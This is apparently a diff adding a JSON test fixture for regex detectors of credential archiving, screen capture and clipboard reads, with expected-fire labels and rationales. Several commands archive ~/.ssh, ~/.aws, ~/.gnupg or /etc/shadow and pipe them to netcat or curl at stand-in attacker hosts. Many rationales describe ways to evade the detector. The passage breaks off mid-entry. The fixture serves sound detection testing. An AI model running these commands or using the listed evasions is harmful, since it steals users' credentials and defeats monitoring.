@@ -1,0 +1,878 @@
+[
+  {
+    "command": "cd ~/.ssh && tar -cf - . | nc 10.0.0.5 4444",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION miss: cd into ~/.ssh then archive '.', so no .ssh token follows the tar verb; regex requires the sensitive path after tar and finds only '.'/'-'."
+  },
+  {
+    "command": "ZDIR=~/.ssh; tar -cf out.tar $ZDIR",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION miss: the sensitive path is hidden behind shell var $ZDIR, no literal .ssh/~ follows tar, so regex stays quiet on real credential staging."
+  },
+  {
+    "command": "gpg --symmetric --output secrets.gpg ~/.ssh/id_rsa",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION miss: gpg --symmetric stages an encrypted blob of an SSH key but there is no tar/zip/7z verb, so the archive regex never engages."
+  },
+  {
+    "command": "find ~/.mozilla -name '*.sqlite' | cpio -o > prof.cpio",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION miss: cpio is a real archiver not covered by the tar|zip|7z alternation, so browser-profile staging slips through."
+  },
+  {
+    "command": "7za a creds.7z ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION miss: regex anchors on '7z a' with a word boundary, but the p7zip binary '7za a' has no boundary between 7z and a, so it is not matched."
+  },
+  {
+    "command": "bsdtar -cf - ~/.aws | openssl enc -aes256 -out a.enc",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION miss: bsdtar (libarchive) is a drop-in tar; the leading \\b means 'bsdtar' is not the 'tar' token, so AWS-cred staging evades."
+  },
+  {
+    "command": "tar -tvf list.tar ~/.ssh/known_hosts",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "TRUE NEGATIVE: -tvf is a read-only LIST operation (no create), not staging; regex correctly requires a 'c' in the flag cluster and stays quiet."
+  },
+  {
+    "command": "tar -czf x.tgz ./.ssh-config-backup",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: '.ssh' is followed by '-' which is a \\b boundary, so the regex matches a harmless project file named .ssh-config-backup, not the real ~/.ssh store."
+  },
+  {
+    "command": "tar -xvcf out.tar -C ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: this is an EXTRACTION (-x) into ~/.ssh, but the flag cluster contains a 'c' so '-?[a-z]*c[a-z]*' matches and the regex wrongly fires on a restore."
+  },
+  {
+    "command": "tar -xzf id_keys.tgz -C ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "TRUE NEGATIVE: pure extraction (-xzf) into ~/.ssh has no 'c' in the cluster, so regex correctly stays quiet on a non-staging restore."
+  },
+  {
+    "command": "tar -czf project-src.tgz ~/projects/myapp",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "TRUE NEGATIVE: archiving a normal project directory with no credential/home token; regex correctly quiet."
+  },
+  {
+    "command": "tar --create --gzip --file=keys.tgz ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: long-form '--create' on the SSH dir is covered by the --create alternative and the .ssh token; should fire."
+  },
+  {
+    "command": "tar -czf creds.tgz $HOME/.aws/credentials",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: env-indirected $HOME path still contains literal .aws which the regex catches; AWS credential staging."
+  },
+  {
+    "command": "tar -caf creds.txz ~/.password-store",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: '-caf' auto-compress cluster contains 'c' and targets the pass password-store; should fire."
+  },
+  {
+    "command": "tar -cf - ~/.gnupg | curl -T - https://drop.evil.sh/u",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: GnuPG keyring archived to stdout and piped to curl exfil; .gnupg token matches."
+  },
+  {
+    "command": "zip -er secrets.zip ~/.kube",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: 'zip -er' (encrypt+recurse) on the kube config dir; '-[a-z]*r' matches and .kube token present."
+  },
+  {
+    "command": "7z a -p creds.7z ~/.docker/config.json",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: '7z a' on the Docker config (often holds registry creds); .docker token matches."
+  },
+  {
+    "command": "tar -czf full-home.tgz ~",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: archiving the entire home dir ('~' at end-of-token) is the canonical whole-home stage-before-exfil; should fire."
+  },
+  {
+    "command": "tar -czvf backup.tar.gz /etc/shadow",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: staging /etc/shadow password hashes; the /etc/(shadow) alternative matches."
+  },
+  {
+    "command": "rsync -a ~/.ssh/ backup-host:/loot/keys",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE NEGATIVE by design-scope: rsync mirrors the SSH dir to a remote host (collection/exfil) but is not an archive verb, so the archive regex cannot see it; flagged false because this signal is archive-only."
+  },
+  {
+    "command": "xclip -selection clipboard -o",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION miss: the canonical clipboard READ form; 'clipboard' has no leading dash so the (?:-\\S+\\s+)* cannot consume it before -o, and the regex fails to match a real paste."
+  },
+  {
+    "command": "echo 'token=abc' | pbcopy",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "TRUE NEGATIVE: pbcopy is a clipboard WRITE, not a read/scrape; regex correctly stays quiet."
+  },
+  {
+    "command": "import boto3  # backup ~/.aws then upload",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "TRUE NEGATIVE: python 'import' keyword, not ImageMagick screen capture; no '.png/.jpg' arg so the import-image alternative does not match."
+  },
+  {
+    "command": "import -window root /tmp/shot.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "TRUE POSITIVE: ImageMagick 'import -window root ...png' is a screen grab; the import-with-image-extension alternative matches."
+  },
+  {
+    "command": "tar -czf /tmp/loot.tar.gz ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Textbook stage-before-exfil: create-archive of the SSH key store; clear true positive."
+  },
+  {
+    "command": "zip -r ~/exfil/creds.zip ~/.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "zip -r of the AWS credential dir; should fire and does."
+  },
+  {
+    "command": "7z a /tmp/stash.7z ~/.password-store",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "7z a of the pass password-store; clear true positive."
+  },
+  {
+    "command": "tar czf all.tgz ~",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Archiving the whole HOME dir (~ at token end); stage-before-exfil true positive."
+  },
+  {
+    "command": "tar -cf - $HOME | nc 10.0.0.5 9001",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "tar of $HOME piped to netcat; $home alternative catches it; classic exfil."
+  },
+  {
+    "command": "tar --create --file=p.tar /etc/passwd /etc/shadow",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "--create form against /etc/passwd+shadow; sensitive-file staging true positive."
+  },
+  {
+    "command": "gtar -czf x.tgz ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION: GNU tar invoked as gtar (common on macOS via brew) — verb alt anchors on 'tar' but \\b before 'tar' fails since 'g' precedes it, so regex MISSES this real cred-archive."
+  },
+  {
+    "command": "bsdtar -czf x.tgz ~/.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION: bsdtar (libarchive, default tar on macOS) — same \\btar\\b miss; archives AWS creds undetected."
+  },
+  {
+    "command": "7za a stash.7z ~/.gnupg",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION: p7zip's 7za binary instead of 7z — regex hard-codes '7z\\s+a', so '7za a' is MISSED while archiving GPG keys."
+  },
+  {
+    "command": "tar -a -cf creds.tar -C ~ .ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Real cred staging but split: create flags then '-C ~' then '.ssh' — happens to still fire via the ~ branch, included as a near-miss boundary case."
+  },
+  {
+    "command": "tar -czf project.tar.gz ~/code/myapp",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Routine archive of a project under ~/code; '~/' is followed by 'code' not a cred dir, so correctly quiet."
+  },
+  {
+    "command": "tar -czf nightly.tar.gz ~/projects",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Backup of ~/projects dir; ~ is immediately followed by '/projects' not whitespace/EOL, so no fire — correct."
+  },
+  {
+    "command": "tar -xzf release-1.2.0.tar.gz",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Archive EXTRACTION of a release tarball; -xzf has no 'c', must stay quiet — correct."
+  },
+  {
+    "command": "tar -tzf artifact.tar.gz",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Listing archive contents (-t); benign, no create — correct negative."
+  },
+  {
+    "command": "npm pack",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Creates an npm tarball but uses no tar/zip/7z verb token; benign release packaging — correct."
+  },
+  {
+    "command": "docker save myimage:latest -o image.tar",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Exports a container image; no tar/zip verb, no cred path — benign, correct."
+  },
+  {
+    "command": "git archive --format=tar -o src.tar HEAD",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "git archive of the repo tree; 'tar' appears only as a format word, not the 'tar\\s+...c' verb — correctly quiet."
+  },
+  {
+    "command": "tar -czf out.tgz ./src ./app.config",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Project archive that includes a file literally named app.config; not the ~/.aws etc dirs, so no fire — correct."
+  },
+  {
+    "command": "tar -czf data.tar.gz data.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE-POSITIVE BAIT that the regex resists: 'data.aws' is preceded by 'a' not [/~ ], so the \\.aws branch does NOT match — correctly quiet, good resilience case."
+  },
+  {
+    "command": "tar -xzvf dump.tar -C ~",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: pure EXTRACTION into home, but the verb alt [a-z]*c[a-z]* latches onto the 'c' in the '-C' (change-dir) flag, so regex WRONGLY fires on a benign restore-into-home."
+  },
+  {
+    "command": "tar -tcf manifest.txt list.tar ~/.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: -t is LIST mode (just inspecting ~/.aws contents), but the stray 'c' in the flag bundle satisfies [a-z]*c[a-z]* and ~/.aws triggers — wrongly fires on read-only listing."
+  },
+  {
+    "command": "tar -xf big.tar -C ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: extracting (restoring) keys INTO ~/.ssh; the '-C' flag's 'c' plus the .ssh path make it fire, but creating no exfil archive — benign restore mislabeled."
+  },
+  {
+    "command": "zip -r site.zip ~/code/website",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Routine zip of a website project under ~/code; ~ followed by '/code' not a cred dir — correctly quiet."
+  },
+  {
+    "command": "rsync -az ~/.aws backup-host:/vault/",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Copies the AWS cred dir but via rsync, not an archive-create verb — out of scope for this signal, correctly quiet."
+  },
+  {
+    "command": "screencapture -x ~/Desktop/grab.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "Straightforward macOS screencapture to file; matches screencapture\\b cleanly."
+  },
+  {
+    "command": "screencapture -i -c",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "Interactive capture straight to clipboard (no file); still matches the bare screencapture\\b literal."
+  },
+  {
+    "command": "scrot -u -d 3 /tmp/win.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "Classic Linux scrot capturing the focused window to PNG; matches scrot\\b."
+  },
+  {
+    "command": "maim -g 800x600+0+0 out.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "maim region grab to PNG; matches maim\\b."
+  },
+  {
+    "command": "grim -o DP-1 ~/screen.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "Wayland grim full-output capture; matches grim\\b."
+  },
+  {
+    "command": "gnome-screenshot -f /tmp/s.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "GNOME screenshot to file; matches gnome-screenshot\\b."
+  },
+  {
+    "command": "spectacle -b -n -o /tmp/s.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "KDE Spectacle background mode (-b) saving a file; matches spectacle\\s+-\\S*b."
+  },
+  {
+    "command": "import -window root /tmp/screen.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "ImageMagick screen grab of root window; matches the import -window <id> *.png branch."
+  },
+  {
+    "command": "maim | xclip -selection clipboard -t image/png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "Screen grab piped straight into the clipboard for exfil; matches maim\\b."
+  },
+  {
+    "command": "spectacle -f -o /tmp/cap.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: Spectacle fullscreen (-f) capture to PNG with no 'b' flag, so spectacle\\s+-\\S*b never matches despite being a real screen capture."
+  },
+  {
+    "command": "grimshot save area /tmp/a.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: grimshot wrapper saves a screenshot, but grim\\b needs a boundary after 'grim' and 'shot' follows, so it slips past."
+  },
+  {
+    "command": "flameshot gui -r -p /tmp/shot.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: flameshot is a mainstream screenshot tool entirely absent from the regex alternation."
+  },
+  {
+    "command": "/usr/bin/import -window root /dev/stdout > shot.bin",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: ImageMagick import capturing to stdout (no .png/.jpg token), so the import branch's required image extension never matches."
+  },
+  {
+    "command": "xwd -root -silent | xwdtopnm > /tmp/screen.pnm",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: xwd dumps the whole root window (X11 screen capture) and is not in the regex at all."
+  },
+  {
+    "command": "ffmpeg -f x11grab -video_size 1920x1080 -i :0.0 -frames:v 1 out.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: ffmpeg x11grab single-frame screen capture; ffmpeg is not covered and the .png appears far from any matched token."
+  },
+  {
+    "command": "import -frame -window root grab.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: an extra '-frame' flag sits between 'import' and '-window', breaking the import\\s+(?:-window \\w+ )? structure so neither sub-branch matches."
+  },
+  {
+    "command": "python -c 'import os, sys'",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "Plain Python import with no image filename token; correctly stays quiet."
+  },
+  {
+    "command": "from PIL import Image",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "Python from-import; no .png/.jpg after an import token, so it correctly does not fire."
+  },
+  {
+    "command": "import matplotlib.pyplot as plt",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "import followed by .pyplot, not a png/jpg extension; correctly quiet."
+  },
+  {
+    "command": "git diff > /tmp/screenshot.png.patch",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "A .png appears only inside a .patch filename with no import/capture tool; correctly quiet."
+  },
+  {
+    "command": "cp assets/logo.png dist/static/",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "Copying a PNG asset; no capture utility and png not preceded by import token, so quiet."
+  },
+  {
+    "command": "echo 'remember to import config.png into figma' >> notes.txt",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: benign note where 'import config.png' is plain English, yet import\\s+\\S*\\.png matches and fires wrongly."
+  },
+  {
+    "command": "logger.info('failed to import banner.png asset')",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: log string contains 'import banner.png' contiguously, triggering the import branch despite being a harmless message."
+  },
+  {
+    "command": "screencapture-helper --rebuild-cache",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: 'screencapture-helper' has a word boundary right after 'screencapture' (hyphen), so screencapture\\b matches even though this isn't the capture binary."
+  },
+  {
+    "command": "pbpaste > /tmp/clip.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "Straightforward macOS clipboard read dumped to a file; matches pbpaste\\b cleanly."
+  },
+  {
+    "command": "pbpaste | curl -X POST -d @- https://exfil.example/c2",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "Clipboard read piped straight to network exfil; clear TP that fires."
+  },
+  {
+    "command": "pbpaste|nc 10.0.0.5 9001",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "No-space pipe to netcat still matches pbpaste\\b; TP fires."
+  },
+  {
+    "command": "xclip -o -selection clipboard > /tmp/c.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "When -o comes first the xclip\\s+...-o\\b branch matches; TP fires."
+  },
+  {
+    "command": "xclip -selection clipboard -o | nc evil.host 4444",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION/false-negative: the canonical xclip read form is MISSED because (?:-\\S+\\s+)* requires every token to start with '-' but the selection value 'clipboard' does not."
+  },
+  {
+    "command": "xclip -sel clip -o",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: same root flaw -- 'clip' value lacks a leading dash, so the -o branch never anchors; missed."
+  },
+  {
+    "command": "xclip --output",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: long-form --output is a real read but the regex only covers short -o; missed."
+  },
+  {
+    "command": "xclip --output -selection clipboard | base64 -w0",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: --output long form read then base64-encode for exfil; not matched."
+  },
+  {
+    "command": "xsel -bo > clip.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "xsel -bo is board+output read; matches xsel\\s+-\\S*[bo]\\b; TP fires."
+  },
+  {
+    "command": "xsel --clipboard --output | base64",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: long-form xsel clipboard read is MISSED -- regex only handles -\\S*[bo] short flags."
+  },
+  {
+    "command": "xsel -k -bo > /tmp/clip",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: an intervening non-[bo] flag (-k) breaks xsel matching because, unlike xclip, the xsel branch has no token-skip loop; missed."
+  },
+  {
+    "command": "wl-paste --no-newline > /tmp/clip",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "Wayland clipboard read to file; matches wl-paste\\b; TP fires."
+  },
+  {
+    "command": "wl-paste -n | curl -T - ftp://evil/",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "Wayland clipboard piped to FTP upload; clear TP that fires."
+  },
+  {
+    "command": "powershell -c \"Get-Clipboard | Out-File c:\\loot.txt\"",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "Windows clipboard read saved to disk; matches get-clipboard\\b case-insensitively; TP fires."
+  },
+  {
+    "command": "python3 -c 'import pyperclip; print(pyperclip.paste())'",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: clipboard read via the pyperclip library never touches any of the matched utility names; fully missed."
+  },
+  {
+    "command": "osascript -e 'the clipboard'",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: native macOS AppleScript clipboard read; no utility name present, so the regex misses it."
+  },
+  {
+    "command": "pbcopy < secret.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "Clipboard WRITE (loads file into clipboard); regex correctly stays quiet since pbcopy is not matched."
+  },
+  {
+    "command": "echo hello | xclip -selection clipboard",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "Clipboard WRITE (no -o); correctly not matched."
+  },
+  {
+    "command": "xclip -i < /etc/hostname",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "xclip input/WRITE; correctly quiet (no -o)."
+  },
+  {
+    "command": "xsel -i < notes.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "xsel input/WRITE; -i has no b/o so correctly stays quiet."
+  },
+  {
+    "command": "xsel -ib < secret.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: this is a WRITE (input to clipboard board) but -\\S*[bo] matches the 'b' in -ib, so the regex wrongly fires."
+  },
+  {
+    "command": "my-pbpaste-wrapper --run",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: a hyphenated wrapper name; \\b fires at the '-' boundary before 'pbpaste', so the regex wrongly catches a non-clipboard tool name."
+  },
+  {
+    "command": "grep -o 'pbcopy' install.log",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "grep with -o extract flag over a log; 'pbcopy' is a quoted pattern, not an invocation -- correctly quiet."
+  },
+  {
+    "command": "git log --oneline -n 5",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "Ordinary git command; no clipboard tool; correctly quiet."
+  },
+  {
+    "command": "tar czf /tmp/creds.tgz ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Textbook stage-before-exfil: create-tar of the SSH key store; clean true positive the regex catches."
+  },
+  {
+    "command": "7z a vault.7z ~/.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "7z a of the AWS credential dir is a credential-store archive; regex correctly fires."
+  },
+  {
+    "command": "zip -r gnupg-backup.zip ~/.gnupg",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Recursive zip of the GnuPG keyring; clear staging positive caught by the zip -..r branch."
+  },
+  {
+    "command": "gtar -czf /tmp/loot.tgz ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION: GNU tar invoked as gtar; \\btar word-boundary fails to match the g-prefixed binary, so credential archiving slips by."
+  },
+  {
+    "command": "bsdtar -cf cred.tar ~/.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION: bsdtar (libarchive) creates the archive but the \\btar anchor misses the bsd prefix; AWS creds staged undetected."
+  },
+  {
+    "command": "tar --zstd -cf h.tar ~",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION: a flag (--zstd) sits between 'tar' and the create flag, so 'tar\\s+(?:-?[a-z]*c...)' cannot reach the -cf; whole-home archive missed."
+  },
+  {
+    "command": "7za a secret.7z ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "EVASION: 7za is the standalone p7zip binary; '7z\\s+a' needs a space after 7z, so 7za-a is never matched while .ssh is archived."
+  },
+  {
+    "command": "tar -czvf dist.tar.gz ./build/output",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Benign release build: archiving a project output dir, no credential path or home; regex correctly stays quiet."
+  },
+  {
+    "command": "tar xzf release.tar.gz -C ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "This is EXTRACTION (x flag) into .ssh, not create; the c-flag branch doesn't match, so the regex correctly does not fire on a non-staging op."
+  },
+  {
+    "command": "grep -rn 'tar -czf ~/.ssh' ./docs/runbook.md",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: a grep over docs that merely contains the literal 'tar -czf ~/.ssh' string; substring match fires on benign documentation noise."
+  },
+  {
+    "command": "cat ~/.aws/notes-about-tar-create.txt",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Benign read of a notes file under ~/.aws; no create-verb is adjacent to a credential path, so regex correctly stays quiet."
+  },
+  {
+    "command": "git commit -m 'add tar archive of ssh config docs'",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Benign commit message mentioning tar/ssh words; the create-flag pattern is absent so it correctly does not fire."
+  },
+  {
+    "command": "echo 'see ~/.aws/config for the zip -r recipe'",
+    "target_signal": "collection.archive_staging",
+    "should_fire": false,
+    "rationale": "Benign echo of README-style text; 'zip -r' appears before ~/.aws but the [^\\n]* between zip-flag and path still does not reconstruct a real archive op here, regex stays quiet."
+  },
+  {
+    "command": "screencapture -x /tmp/shot.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "macOS screencapture writing a PNG; clean screen-capture true positive."
+  },
+  {
+    "command": "import -window root /tmp/cap.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "ImageMagick import grabbing the root window to PNG; matches the -window form, correct positive."
+  },
+  {
+    "command": "import -window root -resize 50% /tmp/cap.png",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: an extra flag (-resize 50%) sits between -window root and the .png target, so the rigid 'import\\s+(?:-window \\w+\\s+)?\\S*\\.png' cannot reach the filename; capture missed."
+  },
+  {
+    "command": "import /tmp/cap.webp",
+    "target_signal": "collection.screen_capture",
+    "should_fire": true,
+    "rationale": "EVASION: import to a .webp file; the extension alternation only lists png/jpe?g, so a WebP screen grab evades the signal."
+  },
+  {
+    "command": "python -c 'import screenshot_lib'",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "Benign Python import keyword; no image-file extension follows, so the import-branch correctly does not fire (the must-not-fire-on-import case)."
+  },
+  {
+    "command": "convert import.png out.jpg",
+    "target_signal": "collection.screen_capture",
+    "should_fire": false,
+    "rationale": "Benign ImageMagick convert where the input file is literally named import.png; no 'import ' + space precedes the filename, so regex correctly stays quiet."
+  },
+  {
+    "command": "pbpaste | grep -i password",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "macOS clipboard READ piped into a password grep; classic scrape, correct true positive."
+  },
+  {
+    "command": "xclip -o -selection clipboard",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "xclip clipboard read with -o placed first; the (?:-\\S+\\s+)* then -o sequence matches, correct positive."
+  },
+  {
+    "command": "xclip -selection clipboard -o",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: the most common xclip read form has 'clipboard' (a bare non-dash word) between -selection and -o, breaking the (?:-\\S+\\s+)* run so the trailing -o is never reached; clipboard read missed."
+  },
+  {
+    "command": "xsel --output --clipboard",
+    "target_signal": "collection.clipboard",
+    "should_fire": true,
+    "rationale": "EVASION: xsel long-form read uses --output, but 'xsel\\s+-\\S*[bo]' expects a single-dash bundle ending in b/o; the double-dash long flag evades it."
+  },
+  {
+    "command": "pbcopy < secret.txt",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "Clipboard WRITE (pbcopy), not a read; regex correctly stays quiet per the must-not-fire-on-write rule."
+  },
+  {
+    "command": "grep -rn 'wl-paste' ./scripts/clip.sh",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: grepping source for the literal token 'wl-paste'; substring match fires on benign code-search noise even though nothing reads the clipboard."
+  },
+  {
+    "command": "git commit -m 'fix pbpaste handling in clipboard util'",
+    "target_signal": "collection.clipboard",
+    "should_fire": false,
+    "rationale": "FALSE POSITIVE: a commit message that merely mentions pbpaste; pbpaste\\b matches inside the quoted text, firing on benign dev noise."
+  },
+  {
+    "command": "tar \"c\"zf /tmp/loot.tar.gz ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "Quoting the c flag (t\"c\"zf normalizes to tar \"c\"zf) breaks tar\\s+...c... so the create branch never matches the SSH-store archive -> evasion the regex MISSES."
+  },
+  {
+    "command": "gtar czf /tmp/x.tgz ~/.gnupg",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "GNU tar alias gtar archives ~/.gnupg, but \\btar word-boundary anchors to a standalone 'tar' token so gtar evades."
+  },
+  {
+    "command": "bsdtar -a -cf /tmp/creds.zip ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "bsdtar (default tar on macOS) creates an archive of ~/.ssh; \\btar misses the bsdtar token -> false negative."
+  },
+  {
+    "command": "7za a /tmp/secret.7z ~/.ssh",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
+    "rationale": "7za is the standalone p7zip binary; pattern requires '7z\\s+a' (space after 7z) so '7za a' on the SSH store evades."
+  },
+  {
+    "command": "cd /tmp && tar czf creds.tar.gz $HOME/.aws",
+    "target_signal": "collection.archive_staging",
+    "should_fire": true,
